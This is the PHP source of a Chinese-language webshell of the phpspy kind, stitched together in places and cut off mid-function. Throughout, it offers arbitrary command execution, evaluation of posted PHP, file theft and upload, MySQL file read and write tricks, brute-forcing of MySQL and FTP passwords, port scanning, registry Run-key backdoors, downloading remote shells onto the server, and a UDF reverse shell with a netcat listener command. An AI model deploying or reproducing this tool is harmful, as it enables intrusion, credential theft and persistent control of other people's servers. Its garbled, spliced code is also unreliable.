<?php
error_reporting(7);
//设定错误讯息回报的等级
ob_start();
//打开缓冲区,当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。为了输出缓冲区的内容，可以使用ob_end_flush()或flush()输出缓冲区的内容。 
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
@set_time_limit(0);
//非安全模式可以使用上面的函数，超时取消。
/*===================== 程序配置 =====================*/
// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check'] = "0";
// 如果需要密码验证,请修改登陆密码
$admin['pass']  = "1234567";
//默认端口表
$admin['port'] = ",21,22,23,25,53,69,79,80,110,119,143,139,389,443,1080,1433,2401,3128,3306,3389,4899,5432,5631,5900,6000,7000,8000,8080,43958";
//跳转用的秒
$admin['jumpsecond'] = "1";
//是否显示alexa排名
$admin['alexa'] = "2";
//Ftp破解用的连接端口
$admin['ftpport'] = "21";
// 是否允许phpspy本身自动修改编辑后文件的时间为建立时间(yes/no)
$retime = "No";
// 默认cmd.exe的位置,proc_open函数要使用的,linux系统请对应修改.(假设是winnt系统在程序里依然可以指定)
$cmd = "cmd.exe";

// 下面是phpspy显示版权那栏的，因为被很多程序当成作为关键词杀了，还是不懂表改~~

$notice = "[<a href=\"http://www.51shell.cn\" title=\"浅蓝的辐射鱼\">Saiy</a>]  [<a href=\"http://www.4gnel.net\" title=\"安全天使\">S4T</a>]  [<a href=\"http://1v1.name\" title=\"7jdg\">7jdg</a>]<br><FONT color=#ff3300>声明:请勿使用本程序从事非法行为，否则后果自负！</font>";
/*===================== 配置结束 =====================*/
// 允许程序在 register_globals = off 的环境下工作
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== 身份验证 =====================*/
if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 &gt;&gt;&gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 &gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== 验证结束 =====================*/

// 判断 magic_quotes_gpc 状态
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}
// 查看PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
	exit;
}

if($_GET['action'] == "nowuser") {
	if(get_current_user()) echo"当前进程用户名:".get_current_user();
	else echo '无法获取当前进行用户名！';
	exit;
}
if(isset($_POST['phpcode'])){
	eval("?".">$_POST[phpcode]<?");
	exit;
}
//news
if($action=="mysqldown"){
	$link=@mysql_connect($host,$user,$password);
	if (!$link) {
		$downtmp = '数据库连接失败: ' . mysql_error();
	}else{
	$query="select load_file('".$filename."');";
	$result = @mysql_query($query, $link);
	if(!$result){
		$downtmp = "读取失败，可能是文件不存在或是没file权限。<br>".mysql_error();
			}else{
	while ($row = mysql_fetch_array($result)) {
		$filename = basename($filename);
		if($rardown=="yes"){
			$zip = NEW Zip;
			$zipfiles[]=Array("$filename",$row[0]);
			$zip->Add($zipfiles,1);
			$code = $zip->get_file();
			$filename = "".$filename.".rar";
		}else{
			$code = $row[0];
		}
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=$filename");
		echo($code);
		exit;
	}
	}
	}
}
//alexa排名
if ($admin['alexa'] != "1")
{$title = "默认关闭";
}else {
$url= "http://data.alexa.com/data?cli=10&dat=snba&url=".$_SERVER['HTTP_HOST'];
$str = file("$url");
$count = count($str);

for ($i=0;$i<$count;$i++){
     $file .= $str[$i];
         }
$title = explode("\" TEXT=\"",$file);
$title = explode("\"/>",$title[1]);
$title = $title[0];
if(!$title) $title = "Not data";

	}
$cckk = "_".date("Ymd",time());

// 在线代理
if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
	exit;
}

// 下载文件
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('你要下的文件不存在!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// 直接下载备份数据库
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "出错: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST'].$cckk."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}
// 程序目录
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// 获取当前路径
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// 判断读写情况
$dir_writeable = (dir_writeable($nowpath)) ? "可写" : "不可写";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">注册表操作</a>" : "";
$servu = (substr(PHP_OS, 0, 3) == 'WIN') ? "| <a href=\"?action=SUExp\">Serv-U EXP</a> " : "";
$adodb = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=adodb\">ADODB</a> " : "";
$mysqlfun = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=mysqlfun\">Func反弹Shell</a> " : "";

$tb = new FORMS;

?><?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td><b>网站排名:'.$title.'</b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('| <a href="?action=dir">Shell目录</a> | <a href="?action=phpenv">环境变量</a> | <a href="?action=proxy">在线代理</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=crack&type=crack">杂项破解</a> | <a href="?action=crack">MySql上传下载</a> | <a href="?action=mix">解压mix.dll</a> | <a href="?action=setting">设置部分</a> |');
$tb->tdbody('| <a href="?action=downloads">Http 文件下载</a> | <a href="?action=search&dir='.$dir.'">文件查找</a> | <a href="?action=eval">执行php脚本</a> | <a href="?action=sql">执行 SQL 语句</a> '.$mysqlfun.' | <a href="?action=sqlbak">MySQL 备份</a>  '.$servu.$adodb.'|  <a href="?action=logout">注销登录</a> |');
$tb->tablefooter();
?><?php
/*===================== 执行操作 开始 =====================*/
echo "<p><b>\n";
// 删除文件
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." 删除成功!" : "文件删除失败!";
	} else {
		echo basename($delfile)." 文件已不存在!";
	}
}

// 删除目录
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir 目录已不存在!";
	} else {
		echo (deltree($deldirs)) ? "目录删除成功!" : "目录删除失败!";
	}
}

// 创建目录
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "该目录已存在!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "创建目录成功!" : "创建失败!";
			@chmod("$mkdirs",0777);
		}
	}
}

// 上传文件
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "上传成功!" : "上传失败!";
}
elseif($action=="mysqlup"){
	$filename = $_FILES['upfile']['tmp_name'];
	if(!$filename) {
		echo"没有选择要上传的文件。。";
	}else{
	$shell = file_get_contents($filename);
	$mysql = bin2hex($shell);
	if(!$upname) $upname = $_FILES['upfile']['name'];
	$shell = "select 0x".$mysql." from ".$database." into DUMPFILE '".$uppath."/".$upname."';";
	$link=@mysql_connect($host,$user,$password);
	if(!$link){
		echo "登陆失败".mysql_error();
	}else{
		$result = mysql_query($shell, $link);
		if($result){
			echo"操作成功.文件成功上传到".$host.",文件名为".$uppath."/".$upname."..";
		}else{
				echo"上传失败 原因:".mysql_error();
			}
		}
	}

}
elseif($action=="mysqldown"){
	if(!empty($downtmp)) echo $downtmp;
}
// 编辑文件
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
    if(!file_exists($editfilename)) unset($retime);
	if($time==$now) $time = @filemtime($editfilename);
        $time2 = @date("Y-m-d H:i:s",$time);
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		if($_POST['change']=="yes"){
		$filecontent = "?".">".$_POST['filecontent']."<?";
		$filecontent = gzdeflate($filecontent);
        $filecontent = base64_encode($filecontent);
        $filecontent = "<?php\n/*\n代码由http://1v1.name加密!\n*/\neval(gzinflate(base64_decode('$filecontent')));\n"."?><?php
// 目录列表
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			if($dirperm=="0777") $dirperm = "<span class=\"redfont\">".$dirperm."</span>";
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\"><INPUT type=checkbox value=$file name=dl[]> [<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=search&dir=".$filepath."\">Search</a></td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">改名</a> |</td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=="proc_open"){
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
if (is_resource($process)) {

    // 写命令
    fwrite($pipes[0], "".$_POST['command']."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    // 读取输出
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
      }
    fclose($pipes[2]);

    proc_close($process);
}
		} else {
			system($_POST['command']);
		}
	}
	?><?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'读取注册表');
	$tb->tdbody('键值: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','读取','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'写入注册表');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('键值: '.$tb->makeinput('writeregname',$registre,'','text','56').' 类型: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' 值:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','写入','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'删除注册表');
	$tb->tdbody('键值: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','删除','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg
elseif ($_GET['action'] == "downloads"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'http文件下载模式');
	$tb->tdbody('你可以使用本功能把一些小工具以http方式下载到此服务器','center');
	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://1v1.name/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('注意,假设文件太大将无法下载下来而且影响执行速度.','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "mix"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'解压缩mix.dll文件');
	$tb->tdbody('在这里可以把压缩在phpspy里的mix.dll解压缩出来。','center');
	$tb->tdbody('解压缩为: '.$tb->makeinput('mixto','./mix.dll','','text','70').''.$tb->makehidden('action','mix').''.$tb->makeinput('','unzip','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('可以使用相对或绝对路径.','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "crack"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->tdbody('这里的组件主要用来突破一些特别的地方而准备，比如内网。','center');
	if($type=="crack"){
		if(!empty($_POST['thename'])) {
			$thehost = gethostbyname($_POST['thename']);
			if(!$thehost) $thehost = '主机名不存在';
	}
	$tb->formheader($action,'暴力破解mysql或ftp密码');
	$tb->tdbody('你在这里设置一些参数进行mysql登陆密码的破解。','center');
	$tb->tdbody('host: '.$tb->makeinput('host','localhost','','text','12').'&nbsp帐号:'.$tb->makeinput('user','root','','text','12').''.$tb->makehidden('do','crack').'&nbsp;字典:'.$tb->makeinput('passfile','./password.txt','','text','20').'&nbsp;一次试探:'.$tb->makeinput('onetime','100','','text','6').'个&nbsp;'.$tb->makeinput('','crack','','submit'),'center','1','35');
	$tb->tdbody('MYSQL:<input type="radio" name="ctype" value="mysql" checked> &nbsp;&nbsp;Ftp:<input type="radio" name="ctype" value="ftp">','center');
	echo "</form>";
	if(getphpcfg("allow_url_fopen")=="Yes") $temp = "或远程文件";
	$tb->tdbody('字典可以使用相对或绝对路径'.$temp.'，Ftp的密码破解测试已经通过。','center');
	$tb->formheader($action,'端口扫描');
	$tb->tdbody('在这里可以进行端口的简单扫描。','center');
	$tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;端口表:'.$tb->makeinput('port',''.$admin[port].'','','text','60').'','center','1','35');
	$tb->tdbody(''.$tb->makeinput('','进行端口扫描','','submit').'','center');
	echo "</form>";
	$tb->tdbody('端口表请把你要查的端口用逗号隔开!','center');
	$tb->formheader('?action=crack&type=crack','主机名 to IP转换 （内&外网有效）');
	$tb->tdbody('假设你获取到内网一个计算机名，想找到它的IP时候。','center');
	$tb->tdbody('主机名: '.$tb->makeinput('thename',$thename,'','text','20').'&nbspIP:'.$tb->makeinput('thehost',$thehost,'','text','20').''.$tb->makeinput('','互相转换','','submit'),'center','1','35');
	echo "</form>";
}else{
	$tb->formheader("".$action."\" enctype=\"multipart/form-data",'使用Mysql上传文件');
	$tb->tdbody('利用Mysql连接帐号把文件以mysql的权限导到Webshell权限本身不可写的地方','center');
	$tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').'db: '.$tb->makeinput('database','mysql.user','','text','16').'upto: '.$tb->makeinput('uppath','c:/','','text','16').''.$tb->makehidden('action','mysqlup'),'center','1','35');
	$tb->tdbody('上传后文件名: '.$tb->makeinput('upname','','','text','16').'选择文件: '.$tb->makeinput('upfile','','','file','26').''.$tb->makeinput('','upload','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('貌似只要有file权限的帐号就可以了,不写上传后文件名则为原来文件名。.','center');
	$tb->formheader($action,'利用Mysql下载文件');
	$tb->tdbody('利用Mysql连接帐号下载Webshell不能读取下载的文件或数据库服务器文件。 启用压缩： <input type="checkbox" name="rardown" value="yes" onclick="javascript:alert(\'使用此功能的时候会RAR压缩后下载你所选择的文件。!\')"> ','center');
	$tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').''.$tb->makehidden('action','mysqldown').'文件: '.$tb->makeinput('filename','C:/windows/php.ini','','text','26').''.$tb->makeinput('','download','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('貌似只要有file权限的帐号就可以了,至少可以读到邻居了.','center');
	$tb->tdbody('Windows默认情况下Mysql为System权限，而Linux系统则权限不高。.','center');
}
	$tb->tablefooter();
}
elseif($_GET['action']=="setting"){
	if($admin[check]=="1") $check[1] = "checked";
	else $check[2] ="checked";
		if($admin[alexa]=="1") $check[3] = "checked";
	else $check[4] ="checked";
	$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action ,'设置部分');
	$tb->tdbody('程序的基本设置部分。','center');
	//$tb->tdbody('网站排名显示: '.$tb->makeinput('alexa',$admin[alexa],'','text','20').'','center');
	$tb->tdbody('是否显示网站排名:&nbsp;&nbsp;Yes:<input type="radio" name="alexa" value="1" '.$check[3].'> &nbsp;&nbsp;No:<input type="radio" name="alexa" value="2" '.$check[4].'>','center');
	$tb->tdbody('密码: '.$tb->makeinput('pass',$admin[pass],'','text','12').'破解时跳秒: '.$tb->makeinput('jumpsecond',$admin[jumpsecond],'','text','2').'','center');
	$tb->tdbody('默认端口表: '.$tb->makeinput('port',$admin[port],'','text','33').'','center');
	$tb->makehidden('do','setting');
	$tb->tdbody('是否使用密码:&nbsp;&nbsp;&nbsp;&nbsp;使用:<input type="radio" name="check" value="1" '.$check[1].'> &nbsp;&nbsp;不使用:<input type="radio" name="check" value="2" '.$check[2].'>','center');
	$tb->tdbody($tb->makeinput('','保存修改','','submit'),'center');
	echo "</form>";
	$tb->tdbody('假设修改了密码的话必须要重新登陆才可以进入webshell。','center');
	$tb->tableheader();
}
elseif ($_GET['action'] == "search"){
$action = '?dir='.$dir.'';
	$tb->tableheader();
	$tb->formheader($action,'文件查找');
	$tb->tdbody('你可以使用本功能查找一个目录下的文件里哪写文件包含着关键词!','center');
	$tb->tdbody('文件位置: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>查找文字:'.$tb->makeinput('oldkey','下贱','','text','60').''.$tb->makehidden('do','search').'<br> 是否计算所在行<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'选定此处将会列出关键词在所在文件的多少行,和所在的那文件有多少行进行比对\\n\\n格式为:[所在行/文件总行]例如[12/99],用来进行分析.\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> (此功能和下面一个功能会影响执行速度，所以默认关闭!) <br>适当读取:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'选定此处将会列出关键词在所在位置及你设定结束区域内的部分字符..\\n\\n采取此功能查找完文件后把鼠标移动到找到的文件名上即可读取分析....\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> 读取关键词前'.$tb->makeinput('beline','0','','text','3').'个字符 '.$tb->makehidden('dir',''.$dir.'').'到关键词后第'.$tb->makeinput('endline','10','','text','3').'个字符... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','开始查找文件','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('请表太大的目录了，慢慢浏览慢慢找好不好嘛.假设选定计算行速度会慢。显示[所在行/总共多少行]','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "proxy") {
	$url="http://1v1.name";
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'在线代理','proxyframe');
	$tb->tdbody('<br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="'.$url.'"></iframe>');
	if (strlen($url) != 15) {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"0;URL=".$self."\">";
	}
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';

	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
if($type=="fun"){
$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*这个最好先执行了上面一句再用*/
/*请在你计算机上执行 nc -vv -l -p 8888*/";
}
	$tb->tableheader();
	$tb->formheader($action,'执行 SQL 语句');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query
elseif ($_GET['action'] == "adodb") {
	$action = '?action=adodb';
	if($type=='mysql'){
		$sqltype = 'Driver={MySql};Server=127.0.0.1;Port=3306;Database=DbName;Uid=root;Pwd=****';
		$echotype = "[Mysql]";
	}
	elseif($type=='mssql') {
		$sqltype = 'Driver={Sql Server};Server=127.0.0.1,1433;Database=DbName;Uid=sa;Pwd=****';
		$echotype = "[Mssql]";
	}
	elseif($type=='access'){
		$sqltype = 'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\本地站点\DbName.mdb;Jet OLEDB:Database Password=***';
		$echotype = "[Access]";
	}elseif($type=='oracle'){
		$sqltype = 'Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;';
		$echotype = "[Oracle]";
	}elseif($type=='db2'){
		$sqltype = 'Provider=DB2OLEDB;Network Transport Library=TCPIP;Network Address=127.0.0.1;Initial Catalog=MyCtlg;Package Collection=MyPkgCol;Default Schema=Schema;User ID=帐号;Password=密码';
		$echotype = "[DB2]";
	}
	if($_POST['sqltype']) $sqltype = $_POST['sqltype'];;
	if(!isset($sqltype)) $sqltype = '请选择数据库类型或自己输入adodb连接语句。';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
echo <<<EOM
<SCRIPT language=JavaScript>
function mycopy()
{
content=document.all.sqltype.value;
clipboardData.setData('text',content);
alert('类型已经复制,可以粘贴在其他地方.')
}
</SCRIPT>
EOM;
	$tb->tableheader();
	$tb->formheader($action,'使用 ADODB 执行 SQL 语句');
	$tb->tdbody('(<a href="?action=adodb&type=mysql">Mysql</a>) (<a href="?action=adodb&type=mssql">Mssql</a>) (<a href="?action=adodb&type=access">Access</a>) (<a href="?action=adodb&type=oracle">Oracle</a>) (<a href="?action=adodb&type=db2">DB2</a>)');
		$tb->tdbody(' 这里利用Windows默认开启的COM组件执行数据库，在某些情况下或许用得上，需要被添加数据源。');
	$tb->tdbody(''.$echotype.'  SQL Type: '.$tb->makeinput('sqltype',$sqltype,'','text','65').'&nbsp;<a href="#" onclick="mycopy()">Copy</a>');
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','adodbquery');
	$tb->makehidden('type',$type);
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'备份 MySQL 数据库');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b>您没有连接数据库 or 当前数据库没有任何数据表</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">请选择表:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> 备份数据所保存的路径:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].$cckk.'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> 直接下载到本地 (适合数据量较小的数据库)</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup
elseif ($_GET['action'] == "phpenv") {
	$user = " <a href=\"?action=nowuser\" target=\"_blank\">获取当前进程用户名</a> ";
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
